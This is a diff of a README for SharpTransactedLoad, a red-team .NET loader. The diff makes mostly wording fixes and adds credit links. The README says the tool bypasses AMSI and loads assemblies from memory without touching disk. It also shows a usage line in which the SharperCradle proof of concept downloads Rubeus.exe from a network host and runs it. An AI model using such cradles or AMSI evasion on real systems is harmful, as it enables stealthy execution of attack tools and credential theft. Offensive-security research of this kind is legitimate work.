@@ -1,16 +1,16 @@
 # SharpTransactedLoad
-Load .net assemblies from memory while having them appear to be loaded from an on-disk location. Bypasses AMSI and expands the number of methods available for use in loading arbitrary assemblies while still avoiding dropping files to disk - some of which provide additional functionality over the traditional Assembly.Load call.  Currently built for .net 4.5, but should be compatibile with other versions.
+Load .net assemblies from memory while having them appear to be loaded from an on-disk location. Bypasses AMSI and expands the number of methods available for use in loading arbitrary assemblies while still avoiding dropping files to disk - some of which provide additional functionality over the traditional Assembly.Load call.  Currently built for .net 4.5, but should be compatible with other versions.
 
 ## Building and Using
-**Note**: Testing was done with an x64 build, and as a result I would recommend building the project as x64. This still allows you to reflectively load both x86 and x64 assemblies from memory, this just controls the architecture of the dll itself. Although "Any CPU" appears to function as intended as well, I have no clue if any weird behavior would be exhibited when attempting to inject into an x86 process etc.
+**Note**: Testing was done with an x64 build, and as a result I would recommend building the project as x64. This still allows you to reflectively load both x86 and x64 assemblies from memory.  Rather, this setting just controls the architecture of the dll itself. Although "Any CPU" appears to function as intended as well, I have no clue if any weird behavior would be exhibited when attempting to inject into an x86 process etc.
 
-This repo consists of two projects: SharpTransactedLoad (STL) and SharperCradle.  STL contains the actual code and compiles to a .dll that can then be used in other projects.  SharperCradle is a very simple proof of concept web download cradle showing how STL can be used in a portable tool to avoid having to call Assembly.Load(byte[]).  Both projects use Costura to merge all the necessary DLLs into a single portable package.
+The repo consists of two projects: SharpTransactedLoad (STL) and SharperCradle.  STL contains the actual code and compiles to a .dll that can then be used in other projects.  SharperCradle is a very simple proof of concept web download cradle showing how STL can be used in a portable tool to avoid having to call Assembly.Load(byte[]).  Both projects use Costura to merge all the necessary DLLs into a single portable package.
 
 ### SharpTransactedLoad
 This project builds as a DLL, and as a result it isnt something that can be directly ran.  Rather, once this is built you can add it as a reference in another project and use it by calling "STL.TransactedAssembly.Load(byte[])"
 STL uses EasyHook for hooking functions.  Within the project there are currently two required EasyHook DLLs:
-  - **EasyHook.dll**: sits in the SharpTransactedLoad/SharpTransactedLoad/ folder.  This is a managed DLL and handles communications with the second (unmanaged) EasyHook dll.
-  - **EasyHook64.dll**: sits in the SharpTransactedLoad/SharpTransactedLoad/Costura64 folder.  This is an unmanaged DLL, and handles the actual hooking functions.
+  - **EasyHook.dll**: sits in the SharpTransactedLoad/SharpTransactedLoad/ folder.  A managed DLL and handles communications with the second (unmanaged) EasyHook dll.
+  - **EasyHook64.dll**: sits in the SharpTransactedLoad/SharpTransactedLoad/Costura64 folder.  An unmanaged DLL, and handles the actual hooking functions.
 Both of these DLL's were taken straight from EasyHook, but I definitely understand folks hesitancy to blindly trust pre-compiled code.  If you opt for the more opsec route, the original DLLs can be pulled directly from EasyHook and swapped for the ones currently in the project, just make sure names align.  Also, when browsing the project you may notice the Costura32 folder does not have anything in it.  If you opt to build as x86, I would drop the DLL in there.
 
 **Build instructions:**
@@ -34,5 +34,5 @@ SharperCradle.exe http://192.168.1.100/Rubeus.exe Triage
 ```
 
 ## Credits
-  - @FuzzySec: Prior work on hooking with EasyHook (specifically Dendrobate) and outline that this project followed: 
-  - @Anthemtotheego: Guidance on Transactional NTFS + SharpCradle, which the SharperCradle PoC was based off of: 
+  - [@FuzzySec]( https://twitter.com/FuzzySec): Prior work on hooking with EasyHook - specifically [Dendrobate]( https://github.com/FuzzySecurity/Dendrobate), from which I based this project off of.
+  - [@Anthemtotheego]( https://twitter.com/anthemtotheego): Guidance on Transactional NTFS + [SharpCradle]( https://github.com/anthemtotheego/SharpCradle), which the SharperCradle PoC was based off of.
